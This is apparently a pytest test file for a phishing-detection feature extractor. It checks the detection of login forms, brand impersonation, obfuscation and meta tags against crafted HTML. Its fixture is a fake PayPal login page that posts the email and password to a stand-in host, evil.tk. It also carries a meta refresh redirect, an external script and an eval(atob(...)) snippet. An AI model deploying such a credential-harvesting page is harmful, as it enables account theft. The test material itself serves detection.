"""Tests for page content analysis: form detection, brand impersonation,
resource analysis, obfuscation detection, and meta tag analysis.

Uses crafted HTML strings so no network requests are needed.
"""

import pytest
import pytest_asyncio

from app.features.content_features import ContentFeatureExtractor


@pytest.fixture
def extractor():
    return ContentFeatureExtractor(timeout=5, max_redirects=3)


PHISHING_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>PayPal - Verify Your Account</title>
    <meta http-equiv="refresh" content="0;url=http://evil.tk/steal">
    <meta name="robots" content="noindex,nofollow">
    <link rel="icon" href="https://paypal.com/favicon.ico">
</head>
<body>
    <img src="logo.png" alt="PayPal Logo">
    <h1>Verify your PayPal account</h1>
    <p>Your account has been suspended due to unusual activity.
       Immediate action required. Confirm your password below.</p>
    <form action="https://evil.tk/collect.php" method="POST">
        <input type="text" name="email" placeholder="Email">
        <input type="password" name="password" placeholder="Password">
        <input type="hidden" name="redirect" value="paypal.com">
        <button type="submit">Verify</button>
    </form>
    <a href="#">Terms</a>
    <a href="javascript:void(0)">Help</a>
    <a href="https://external.com/track">Click here</a>
    <script src="https://cdn.evil.tk/tracker.js"></script>
    <script>eval(atob("YWxlcnQoJ3B3bmVkJyk="));</script>
</body>
</html>
"""

SAFE_HTML = """
<!DOCTYPE html>
<html>
<head><title>Google Search</title></head>
<body>
    <h1>Welcome to Google</h1>
    <form action="/search" method="GET">
        <input type="text" name="q" placeholder="Search">
        <button type="submit">Search</button>
    </form>
    <a href="https://about.google.com">About</a>
    <a href="https://google.com/privacy">Privacy</a>
</body>
</html>
"""


# ---------------------------------------------------------------------------
# Form detection
# ---------------------------------------------------------------------------

class TestFormDetection:
    @pytest.mark.asyncio
    async def test_login_form_detected(self, extractor):
        features = await extractor.extract(
            url="http://evil.tk/login", html_content=PHISHING_HTML
        )
        assert features["has_login_form"] is True
        assert features["has_password_field"] is True
        assert features["password_field_count"] == 1

    @pytest.mark.asyncio
    async def test_external_form_action(self, extractor):
        features = await extractor.extract(
            url="http://evil.tk/login", html_content=PHISHING_HTML
        )
        assert features["has_external_form_action"] is True

    @pytest.mark.asyncio
    async def test_hidden_fields(self, extractor):
        features = await extractor.extract(
            url="http://evil.tk/login", html_content=PHISHING_HTML
        )
        assert features["hidden_field_count"] >= 1

    @pytest.mark.asyncio
    async def test_safe_page_no_password_form(self, extractor):
        features = await extractor.extract(
            url="https://google.com", html_content=SAFE_HTML
        )
        assert features["has_login_form"] is False
        assert features["has_password_field"] is False


# ---------------------------------------------------------------------------
# Brand impersonation
# ---------------------------------------------------------------------------

class TestBrandImpersonation:
    @pytest.mark.asyncio
    async def test_brand_detected_in_phishing(self, extractor):
        features = await extractor.extract(
            url="http://evil.tk/login", html_content=PHISHING_HTML
        )
        assert features["brand_similarity_score"] > 0.3
        assert features["detected_brand"] == "paypal"

    @pytest.mark.asyncio
    async def test_brand_logo_found(self, extractor):
        features = await extractor.extract(
            url="http://evil.tk/login", html_content=PHISHING_HTML
        )
        assert features["brand_logo_found"] is True

    @pytest.mark.asyncio
    async def test_brand_favicon_mismatch(self, extractor):
        features = await extractor.extract(
            url="http://evil.tk/login", html_content=PHISHING_HTML
        )
        assert features["brand_favicon_mismatch"] is True

    @pytest.mark.asyncio
    async def test_safe_page_no_brand_impersonation(self, extractor):
        features = await extractor.extract(
            url="https://google.com", html_content=SAFE_HTML
        )
        # google.com IS google, so brand_similarity_score should be 0
        assert features["brand_similarity_score"] == 0.0


# ---------------------------------------------------------------------------
# Resource analysis
# ---------------------------------------------------------------------------

class TestResourceAnalysis:
    @pytest.mark.asyncio
    async def test_external_scripts(self, extractor):
        features = await extractor.extract(
            url="http://evil.tk/login", html_content=PHISHING_HTML
        )
        assert features["external_script_count"] >= 1

    @pytest.mark.asyncio
    async def test_null_links(self, extractor):
        features = await extractor.extract(
            url="http://evil.tk/login", html_content=PHISHING_HTML
        )
        assert features["null_link_count"] >= 2  # # and javascript:void(0)

    @pytest.mark.asyncio
    async def test_external_resource_ratio(self, extractor):
        features = await extractor.extract(
            url="http://evil.tk/login", html_content=PHISHING_HTML
        )
        assert features["external_resource_ratio"] > 0.0


# ---------------------------------------------------------------------------
# Obfuscation detection
# ---------------------------------------------------------------------------

class TestObfuscationDetection:
    @pytest.mark.asyncio
    async def test_eval_detected(self, extractor):
        features = await extractor.extract(
            url="http://evil.tk/login", html_content=PHISHING_HTML
        )
        assert features["has_eval"] is True

    @pytest.mark.asyncio
    async def test_base64_detected(self, extractor):
        features = await extractor.extract(
            url="http://evil.tk/login", html_content=PHISHING_HTML
        )
        assert features["has_base64_data"] is True

    @pytest.mark.asyncio
    async def test_obfuscation_score(self, extractor):
        features = await extractor.extract(
            url="http://evil.tk/login", html_content=PHISHING_HTML
        )
        assert features["obfuscation_score"] > 0.0


# ---------------------------------------------------------------------------
# Meta tags
# ---------------------------------------------------------------------------

class TestMetaTags:
    @pytest.mark.asyncio
    async def test_meta_refresh_detected(self, extractor):
        features = await extractor.extract(
            url="http://evil.tk/login", html_content=PHISHING_HTML
        )
        assert features["has_meta_refresh"] is True

    @pytest.mark.asyncio
    async def test_noindex_detected(self, extractor):
        features = await extractor.extract(
            url="http://evil.tk/login", html_content=PHISHING_HTML
        )
        assert features["has_noindex"] is True


# ---------------------------------------------------------------------------
# Title analysis & text content
# ---------------------------------------------------------------------------

class TestTitleAndTextContent:
    @pytest.mark.asyncio
    async def test_title_brand_mismatch(self, extractor):
        features = await extractor.extract(
            url="http://evil.tk/login", html_content=PHISHING_HTML
        )
        assert features["page_title_match"] > 0.5

    @pytest.mark.asyncio
    async def test_phishing_keywords_in_content(self, extractor):
        features = await extractor.extract(
            url="http://evil.tk/login", html_content=PHISHING_HTML
        )
        assert features["phishing_keyword_count"] >= 2
        assert features["has_urgency_language"] is True

    @pytest.mark.asyncio
    async def test_no_content_returns_defaults(self, extractor):
        features = await extractor.extract(
            url="http://evil.tk/empty", html_content=None
        )
        assert features["content_available"] is False
